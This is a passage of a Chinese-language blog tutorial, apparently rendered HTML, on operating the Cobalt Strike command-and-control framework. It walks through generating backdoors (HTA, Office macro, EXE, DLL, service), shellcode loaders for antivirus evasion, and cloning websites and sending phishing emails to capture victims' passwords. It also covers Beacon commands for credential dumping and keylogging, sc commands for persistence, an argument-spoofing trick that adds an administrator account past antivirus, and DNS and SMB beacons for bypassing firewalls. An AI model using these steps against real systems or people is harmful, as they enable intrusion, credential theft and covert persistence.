+<p>橙黄色的箭头代表命名管道通道。SSH 会话也使用一个橙黄色的箭头。一个淡绿的箭头代表一个 TCP socket 通道。一个红色的（命名管道）或紫色的（TCP）箭头表示一个 Beacon 连接断掉了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081558167.png"
+                     
+                ></p>
+<h2 id="Listener-监听器策略"><a href="#Listener-监听器策略" class="headerlink" title="Listener-监听器策略"></a>Listener-监听器策略</h2><p>你需要为 Cobalt Strike 的 Beacon payload 配置监听器。Beacon 是 Cobalt Strike的 payload，用于建模高级攻击者。使用 Beacon 来通过 HTTP，HTTPS 或 DNS 出口网络。你也可以通过控制经由命名管道和 TCP sockets 的对等（peer-to-peer）Beacon 从而限制出口网络，只允许部分主机直接回连。</p>
+<p>一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个 payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。</p>
+<p>在连接服务端后 首先创建监听器 监听器的payload支持多种协议</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072206580.png"
+                     
+                ></p>
+<h3 id="支持的协议"><a href="#支持的协议" class="headerlink" title="支持的协议"></a>支持的协议</h3><ul>
+<li>Beacon DNS </li>
+<li>Beacon HTTP </li>
+<li>Beacon HTTPS </li>
+<li>Beacon SMB </li>
+<li>Beacon TCP </li>
+<li>External C2 </li>
+<li>Foreign HTTP </li>
+<li>Foreign HTTPS</li>
+</ul>
+<p>beacon是cobalt strike的内置监听器，包括Dns、http、https、smb四种方式的监听器</p>
+<p>foreign为外部监听器，是配合Metasploit或者Armitage的监听器</p>
+<h3 id="地址轮回策略"><a href="#地址轮回策略" class="headerlink" title="地址轮回策略"></a>地址轮回策略</h3><table>
+<thead>
+<tr>
+<th>round-robin</th>
+<th align="center">按主机名的顺序循环浏览主机名列表</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>random</td>
+<td align="center">每次访问时，从列表中随机选择一个主机名  已尝试连接</td>
+</tr>
+<tr>
+<td>failover-xx</td>
+<td align="center">使用每台主机一段时间。指定的持续时间（m、h、d），然后使用下一个主机</td>
+</tr>
+</tbody></table>
+<p>http地址（stager）这个可以填写ip本身，也可以去填写多个域名，但是这个域名解析必须是teamserver的地址。</p>
+<p>攻击-&gt;生成后门-&gt;windows可执行程序 选择好监听器 生成后门</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072206862.png"
+                     
+                ></p>
+<p>直接运行后门，cobalt stike上线</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072207259.png"
+                     
+                ></p>
+<h2 id="Attacks-模块攻击"><a href="#Attacks-模块攻击" class="headerlink" title="Attacks-模块攻击"></a>Attacks-模块攻击</h2><h3 id="生成后门"><a href="#生成后门" class="headerlink" title="生成后门"></a>生成后门</h3><p>生成后门界面里，有几个模块</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072225997.png"
+                     
+                ></p>
+<h4 id="HTA文档"><a href="#HTA文档" class="headerlink" title="HTA文档"></a>HTA文档</h4><p>后门的一种,这里他给我们提供了3种生成方式 </p>
+<ol>
+<li>exe</li>
+<li>powershell</li>
+<li>vba</li>
+</ol>
+<p>HTA 是 HTML Application 的缩写（HTML 应用程序），是软件开发的新概念，直接将 HTML 保存成 HTA 的格式，就是一个独立的应用软件。</p>
+<p>其中VBA方法需要目标系统上的Microsoft Office，一般选择powershell方式，因为这种方式更加容易免杀。通常我们结合文件下载功能来实行钓鱼</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072243091.png"
+                     
+                ></p>
+<p>HTA文件里面是执行powershell代码来运行后门</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072243950.png"
+                     
+                ></p>
+<p>把HTA文件配合文件托管服务配合使用</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072244291.png"
+                     
+                ></p>
+<p>设置好后，当别人访问这个网址的时候</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072245246.png"
+                     
+                ></p>
+<p>提示下载，受害者下载运行时，就会上线</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072245110.png"
+                     
+                ></p>
+<h4 id="office宏病毒"><a href="#office宏病毒" class="headerlink" title="office宏病毒"></a>office宏病毒</h4><p>宏是微软公司为其 OFFICE 软件包设计的一个特殊功能，它利用简单的语法，把常用的动作写成宏。宏病毒传播极快，可以多平台交叉感染，在鱼叉邮件投递内嵌恶意宏的 Word 文档是 APT 活动中经常用到的手法。</p>
+<p>将生成的宏文件放在word文档，当文档可以使用宏时，自动会运行上线。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072246597.png"
+                     
+                ></p>
+<p>打开word自定义选区把开发工具打勾然后插入后保存为dotm，只要打开带有宏的文件就会自动上线</p>
+<p>复制生成的 payload</p>
+<p>新建一个 word 文档, 编辑宏</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081604335.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081604333.png"
+                     
+                ></p>
+<p>另存为 <code>启用宏的 word</code> 文件</p>
+<h4 id="Payload生成器"><a href="#Payload生成器" class="headerlink" title="Payload生成器"></a>Payload生成器</h4><p>CS里提供一个payload的生成器，因为默认的shellcode容易被杀毒软件发现，我们可以编写shellcode加载器来运行payload达到免杀的效果</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072254946.png"
+                     
+                ></p>
+<p>C&#x2F;C++语言写的加载器用VS2022编译时，记得使用Release模式而不是Debug生成解决方案，否则回出现错误</p>
+<h4 id="Windows可执行程序"><a href="#Windows可执行程序" class="headerlink" title="Windows可执行程序"></a>Windows可执行程序</h4><p>提供有三种生成类型</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072255953.png"
+                     
+                ></p>
+<ol>
+<li>windwos可执行程序：EXE 直接双击运行</li>
+<li>windwos服务程序：Service EXE 可以使用SC命令做成服务程序，执行之后会是system权限，这种方法CS留后门的一种方法</li>
+</ol>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;server1&quot; binpath= &quot;C:\WINDOWS\Temp\server1.exe&quot; </span><br><span class="line">shell sc description &quot;server1&quot; &quot;description&quot;</span><br><span class="line">shell sc config &quot;server1&quot; start= auto shell net start &quot;server1&quot;</span><br></pre></td></tr></table></figure></div>
+
+<ol start="3">
+<li>windows dll文件：dll</li>
+</ol>
+<p>在windows的system文件夹下有一个regsvr32.exe的程序，它就是windows自带的activex注册和反注册工具。(activex不注册是不能够被系统识别和使用的，一般安装程序都会自动地把它所使用的activex 控件注册)。Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。regsvr32.exe用法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 [/s] [/n] [/i(:cmdline)] dllname</span><br><span class="line">其中dllname为activex控件文件名，建议在安装前拷贝到system文件夹下。参数有如下意义：</span><br><span class="line">/u——反注册控件（卸载com组建）</span><br><span class="line">/s——不管注册成功与否，均不显示提示框（静默模式，不弹框）</span><br><span class="line">/c——控制台输出</span><br><span class="line">/i——跳过控件的选项进行安装(传给DllInstall的参数内容，regsvr32 允许注册过程中 dll 进行一些自定义的安装过程，该过程在 DllInstall 中实现。)</span><br><span class="line">/n——不注册控件，此选项必须与/i选项一起使用</span><br></pre></td></tr></table></figure></div>
+
+<p>Regsvr32.exe直接调用dll程序</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072258987.png"
+                     
+                ></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\Windows\System32\regsvr32.exe C:\Windows\Temp\artifact.dll</span><br></pre></td></tr></table></figure></div>
+
+<ol start="4">
+<li>windwos可执行程序（Stageless）</li>
+</ol>
+<p>Staged和Stageless的区别就是：前者的实际功能只是和C2建立连接并接收Payload,然后加载执行,而Stageless直接省去了接收Payload的步骤。</p>
+<p>Stageless生成的Payload都会比Staged类型的要大很多, 而且包含了特征明细。</p>
+<h3 id="Web钓鱼"><a href="#Web钓鱼" class="headerlink" title="Web钓鱼"></a>Web钓鱼</h3><p>CS提供了钓鱼模块来方便渗透测试人员</p>
+<ol>
+<li>Manage                对开启的web服务进行管理</li>
+<li>Clone Site            克隆网站，可以记录受害者提交的数据</li>
+<li>Host File             提供一个文件下载，可以修改Mime信息</li>
+<li>Scripted Web Delivery 类似于msf 的web_delivery  </li>
+<li>Signed Applet Attack  使用java自签名的程序进行钓鱼攻击</li>
+<li>Smart Applet Attack   自动检测java版本并攻击，针对Java 1.6.0_45以下以及1.7.0_21</li>
+<li>System Profiler       用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等</li>
+</ol>
+<p>站点管理：这里主要是CS自带的web服务，访问IP加上端口则可以访问</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072336181.png"
+                     
+                ></p>
+<p>克隆网站：这个模块主要的作用是克隆一个网站，发送给受害者，受害者访问的时候，可以收集受害者提交的信息，同时也可以选择攻击下载文件。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072338455.png"
+                     
+                ></p>
+<p>受害者访问的时候会自动弹出下载文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072338719.png"
+                     
+                ></p>
+<p>输入密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072339756.png"
+                     
+                ></p>
+<p>日志信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072341130.png"
+                     
+                ></p>
+<p>信息模块 这个主要是生成一个页面让受害者访问，收集受害者的浏览器系统信息</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072342289.png"
+                     
+                ></p>
+<p>Web投递就是生成并托管一个完整的Payload，通过在目标机器上执行生成的一句话命令即可快速获得一个会话 。至于Applet攻击就是依靠浏览器进行攻击的。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072343630.png"
+                     
+                ></p>
+<h3 id="邮件钓鱼"><a href="#邮件钓鱼" class="headerlink" title="邮件钓鱼"></a>邮件钓鱼</h3><p>首先准备好eml的钓鱼模板，这个模板可以在qq邮箱里导出，选择邮箱钓鱼模板</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072348587.png"
+                     
+                ></p>
+<p>点击发送即可，模板上可以看到URL跳转到准备好的URL</p>
+<h2 id="Interactive-session-交互会话"><a href="#Interactive-session-交互会话" class="headerlink" title="Interactive session-交互会话"></a>Interactive session-交互会话</h2><h3 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h3><p>Beacon 很灵活，支持异步通信模式和交互式通信模式。异步通信效率缓慢：Beacon 会回连团队服务器、下载其任务，然后休眠。交互式通信是实时发生的。</p>
+<p>Beacon 的网络流量指标具有拓展性。可以使用 Cobalt Strike 的可拓展的 C2 语言来重新定义 Beacon的通信。这允许你掩盖 Beacon 行动，比如使其流量看起来像其他的恶意软件，又或者将其流量掺入作为合法流量。</p>
+<p>Beacon的命令详解：</p>
+<p>help command 获取详细命令的使用方法</p>
+<pre><code>Command                   Description
+-------                   -----------
+Ladon                     Ladon large network penetration scanner
+argue                     命令行参数欺骗
+blockdlls                 禁止子进程加载非微软签名的dll
+browserpivot              注入浏览器进程代理用户已认证身份（仅支持IE）
+cancel                    取消正在下载的文件
+cd                        跳转目录
+checkin                   强制目标回连/更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）
+chromedump                提取Chrome保存的账号密码、Cookies等信息
+clear                     清空beacon任务队列
+connect                   通过TCP正向连接远程Beacon
+covertvpn                 部署Covert VPN客户端
+cp                        复制文件
+dcsync                    从域控提取密码hash
+desktop                   远程VNC控制用户桌面
+dllinject                 注入一个内存反射加载的dll到目标进程
+dllload                   使用LoadLibrary方式在目标进程中加载一个dll
+download                  下载文件
+downloads                 列出所有正在下载的文件
+drives                    列出所有磁盘盘符
+elevate                   利用提权漏洞获取一个高权限Beacon
+execute                   在目标上执行程序（无回显）
+execute-assembly          在目标上内存加载执行本地.NET程序
+exit                      结束当前Beacon会话
+getprivs                  在当前进程访问令牌（access token）中启用system特权
+getsystem                 尝试获取SYSTEM用户权限
+getuid                    获取当前进程访问令牌（access token）的用户信息
+hashdump                  获取本地用户hash
+help                      帮助信息
+inject                    在指定进程中注入新的Beacon会话
+inline-execute            在当前会话中执行Beacon Object File
+jobkill                   结束一个后台任务
+jobs                      列出所有后台任务
+jump                      在远程机器上植入Beacon（横向移动）
+kerberos_ccache_use       从ccache文件导入kerberos票据到当前会话中
+kerberos_ticket_purge     清空当前会话中的所有kerberos票据
+kerberos_ticket_use       从ticket文件中导入kerberos票据到当前会话中
+keylogger                 开启键盘记录
+kill                      结束指定进程
+link                      通过命名管道正向连接远程Beacon
+logonpasswords            使用mimikatz获取密码和hash
+ls                        列出目录文件
+make_token                创建进程访问令牌（access token），仅用于访问网络资源
+mimikatz                  运行mimikatz
+mkdir                     创建目录
+mode dns                  使用DNS A记录作为数据通道（仅支持DNS上线Beacon）
+mode dns-txt              使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）
+mode dns6                 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）
+mv                        移动文件
+net                       网络和主机探测工具（内置net命令）
+note                      给当前会话添加备注信息
+portscan                  网络端口扫描
+powerpick                 内存执行Powershell命令（不调用powershell.exe）
+powershell                通过powershell.exe执行Powershell命令
+powershell-import         导入本地powershell脚本到当前会话中
+ppid                      为所有新运行的进程设置伪造的父进程PID
+printscreen               使用PrintScr方式截屏
+ps                        显示进程列表
+psinject                  注入到指定进程后在内存中执行Powershell命令（不调用powershell.exe)
+pth                       使用Mimikatz执行Pass-the-hash
+pwd                       显示当前目录
+reg                       查询注册表
+remote-exec               在远程机器上执行命令（横向移动）
+rev2self                  恢复原始进程访问令牌（access token）
+rm                        删除文件或文件夹
+rportfwd                  反向端口转发（从Cobalt Strike Teamserver发起连接）
+rportfwd_local            反向端口转发（从Cobalt Strike客户端发起连接）
+run                       在目标上执行程序（有回显）
+runas                     以另一个用户身份执行程序
+runasadmin                以高权限执行程序
+runu                      以另一个进程PID作为父进程PID，并以其用户身份执行程序
+screenshot                截屏
+screenwatch               屏幕监控，每隔一段时间截屏
+setenv                    设置环境变量
+shell                     使用cmd.exe执行命令
+shinject                  注入shellcode到指定进程中
+shspawn                   创建傀儡进程并注入shellcode到其中运行
+sleep                     设置beacon回连间隔时间
+socks                     启动SOCKS4a代理服务器
+socks stop                停止SOCKS4a代理服务器
+spawn                     创建一个新Beacon会话
+spawnas                   以另一个用户身份创建一个新Beacon会话
+spawnto                   设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）
+spawnu                    以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话
+spunnel                   运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike Teamserver发起连接）
+spunnel_local             运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike客户端发起连接）
+ssh                       通过SSH连接远程主机（使用账号密码认证）
+ssh-key                   通过SSH连接远程主机（使用证书私钥认证）
+steal_token               从指定进程中窃取访问令牌（access token)
+timestomp                 复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造）
+unlink                    断开与beacon的连接（用于通过TCP、命名管道连接的beacon）
+upload                    上传文件
+</code></pre>
+<p>在Cobalt Strike中它的心跳默认是60s，即每一分钟目标主机与teamserver通信一次，这会让我们执行命令或进行其他操作响应很慢，一般设置心跳值为5s即可，如果在使用socks代理的话，设置为心跳值为0即可，在beacon中不能直接使用系统CMD命令，想要执行系统命令需要使用shell命令，即在系统命令前面加上shell即可。</p>
+<p>某些任务会开始一个 jobs 任务,当不需要这些进程时,可以运行 jobs 查看任务进程,并结束进程</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span>            <span class="comment"># 查看进程</span></span><br><span class="line">jobkill [JID]   <span class="comment"># 杀掉指定的进程</span></span><br></pre></td></tr></table></figure></div>
+
+<p>argue 进程参数欺骗后可使用 run 或 execute 来执行 net1 命令添加一个管理员用户，全程无拦截，而用 shell 执行 net1 命令时仍然会被拦截，因为它还是通过创建一个 cmd.exe 子进程来执行的。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">argue 进程参数欺骗</span><br><span class="line">argue [command] [fake arguments]</span><br><span class="line">argue 命令 假参数 欺骗某个命令参数</span><br><span class="line">argue [command]</span><br><span class="line">argue 命令 取消欺骗某个命令参数</span><br><span class="line"></span><br><span class="line">beacon&gt; argue net1 /bypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypassbypass</span><br><span class="line">beacon&gt; run net1 user demouser Abcd!@#$12 /add</span><br><span class="line">beacon&gt; run net1 localgroup administrators what /add</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081606048.png"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081606053.png"
+                     
+                ></p>
+<h3 id="Spawn-派生"><a href="#Spawn-派生" class="headerlink" title="Spawn 派生"></a>Spawn 派生</h3><p>spawn 的功能就是可以派生出更多的 Beacon 让一个团队分布式渗透。通常我们在团队主服务器上给队友来派生 Beacon 这样只要主服务器权限不掉，还能继续操作。尽量派生出多个 Beacon，让我们的操作都在子 Beacon。</p>
+<p>灵活的运用 Spawn 可以提高团队效率，权限维持，和 MSF、Armitage 互转会话。</p>
+<h4 id="HTTP-Beacon-和-HTTPS-Beacon"><a href="#HTTP-Beacon-和-HTTPS-Beacon" class="headerlink" title="HTTP Beacon 和 HTTPS Beacon"></a>HTTP Beacon 和 HTTPS Beacon</h4><p><strong>相关文章</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_self-signed-ssl-certificates.htm" >https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_self-signed-ssl-certificates.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_valid-ssl-certificates.htm" >https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_valid-ssl-certificates.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<h3 id="DNS-上线"><a href="#DNS-上线" class="headerlink" title="DNS 上线"></a>DNS 上线</h3><p>如果在内网中，防火墙只允许DNS出网，可以使用DNS后门上线，在cs里面内置了一个DNS上线模块。我们假设查询Dns发现可以出网，使用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></table></figure></div>
+
+<p>准备一个域名，设置NS记录和A记录，并且把NS记录指向A记录，在公网的vps里，去启动服务器端并且挂在后端执行，然后建立DNS监听器</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302072223612.png"
+                     
+                ></p>
+<p>因为DNS的默认端口是53端口，在ubuntu的53端口默认是开启的，如果出现占用情况，把53端口关闭。使用web传递攻击执行powershell命令，上线是一个黑色的图标，使用命令<code>checkin</code>，强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver），在beacon中支持三种DNS执行命令方式，一般使用<code>mode dns-txt</code>较多。</p>
+<h4 id="DNS-Beacon"><a href="#DNS-Beacon" class="headerlink" title="DNS Beacon"></a>DNS Beacon</h4><p>DNS Beacon 使用 DNS 请求来将 Beacon 返回给你。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。DNS Beacon 在绕过防火墙权限维持上非常有效.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081601620.png"
+                     
+                ></p>
+<p>在 Cobalt Strike 4.0 及之后的版本中，DNS Beacon 是一个仅 DNS 的 payload。在这个 payload 中，没有 HTTP 通信模式。这是与之前的版本的产品不同的地方。</p>
+<p><strong>相关文章</strong></p>
+<ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7938" >踩坑记录-DNS Beacon <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7488" >cobaltstrike dns beacon知多少 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/256032.html" >CS上线之DNS隧道踩坑记 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm" >https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_dns-beacons.htm <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ul>
+<p><strong>数据通道</strong></p>
+<p>DNS Beacon 可以通过 DNS TXT 记录、DNS AAAA 记录或 DNS A 记录下载任务。当其在目标上，此 payload 有在这些数据通道之间切换的灵活性。使用 Beacon 的模式命令来改变当前 Beacon 的数据通道。</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mode dns        <span class="comment"># DNS A 记录数据通道；</span></span><br><span class="line">mode dns6       <span class="comment"># DNS AAAA 记录数据通道；</span></span><br><span class="line">mode dns-txt    <span class="comment"># DNS TXT 记录数据通道。DNS TXT 记录是默认的数据通道。</span></span><br></pre></td></tr></table></figure></div>
+
+<p><strong>监听器设置</strong></p>
+<p>创建一个 DNS Beacon 监听器，选择 Beacon DNS 作为 payload 类型。</p>
+<p>点击 [+] 来添加一到多个与 beacon 通信的域名。你的 CS 团队服务器系统必须对你指定的域名具有权威性。创建一个 DNS A 记录然后指向你的 CS 团队服务器。使用 DNS NS 记录来将多个域名或子域名委派到你的 Cobalt Strike 团队服务器的 A 记录。</p>
+<p>DNS HOST(Stager) 字段配置 DNS Beacon 的 TXT 记录 stager。这个 stager 仅被用在要求显式 stager 的 Cobalt Strike 功能中。你的 Cobalt Strike 团队服务器系统也必须对此域名具有权威性。</p>
+<p>要测试你的 DNS 配置，打开一个终端并输入 nslookup jibberish.beacon domain （domain 自行替换为 stager 域名）。如果你得到了一个 0.0.0.0 的 A 记录回复——这说明你的 DNS 配置是对的。如果你没有得到回复，那说明你的 DNS 配置不对、DNS Beacon 不会与你通信。</p>
+<p>确保你的 DNS 记录引用了你的网络接口的首选地址（primary address）。Cobalt Strike 的 DNS 服务器会一直从你的网络接口的首选地址发送响应。当 DNS 解析器从一台服务器请求信息，但是从另一台服务器接收回复时，DNS 解析器往往会丢弃回复。</p>
+<p>如果你的团队服务器在内网中，请确保用你的公网 IP 地址作为 NS 记录，并将你的防火墙设置为转发 53 端口上的 UDP 流量到你的系统。Cobalt Strike 包含一个控制 Beacon 的 DNS 服务器。</p>
+<p>当启动一个 DNS Beacon 的时候，就相当于 Cobalt Strike 把团队服务器作为了一个 DNS 的解析服务器。当受害主机进行 DNS 请求的时候，就需要给 53 端口发包。如果团队服务器在内网中，就需要把公网 IP 的 53 端口和内网 IP 做一个端口映射，相当于把外网的 53 端口映射到内网的团队服务器上去。</p>
+<p>域名建立 A 记录和 NS 记录</p>
+<ul>
+<li>A 记录指向服务器 ip</li>
+<li>ns 记录都指向 A 记录域名</li>
+</ul>
+<p>只要木马在目标主机执行成功，我们的 CobaltStrike 就能接收到反弹的 shell。但是默认情况下，主机信息是黑色的。</p>
+<p>我们需要执行以下命令，让目标主机信息显示出来</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checkin</span><br><span class="line">mode dns-txt</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<h3 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB beacon"></a>SMB beacon</h3><p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效。</p>
+<p>这张图诠释了SMB beacon的工作流程：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081141386.png"
+                     
+                ></p>
+<p>存在以下2个条件：</p>
+<ol>
+<li>具有 SMB Beacon 的主机必须接受端口 445 上的连接。</li>
+<li>只能链接由同一 Cobalt Strike 实例管理的 Beacon</li>
+</ol>
+<p>这种beacon要求具有SMB Beacon的主机必须接受端口445上的连接，派生一个SMB Beacon方法：在监听器生成SMB Beacon&gt;目标主机&gt;右键&gt;新建会话&gt;选中对应的监听器&gt;上线。或在beacon中使用命令spawn smb（smb为我的smb 监听器名字）</p>
+<p>当SMB Beacon运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081144885.png"
+                     
+                ></p>
+<blockquote>
+<p>当前是连接状态，你可以Beacon上用link 命令链接他或者unlink 命令断开它</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081143594.png"
+                     
+                ></p>
+<p>这种beacon在内网横向渗透中运用的很多，横向渗透留到日后再讲。在内网环境中可以使用IPC $生成的SMB Beacon上传到目标主机执行，但是目标主机并不会直接上线的，需要我们自己用链接命令(link)去连接他。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://icml0x824.oss-cn-hangzhou.aliyuncs.com/202302081145665.png"
+                     
+                ></p>
+<p>当前连接12SERVER5因为密码与12SERVER相同,dir可以访问12SERVER5的c盘，就可以使用jump psexec64建立smb beacon。</p>
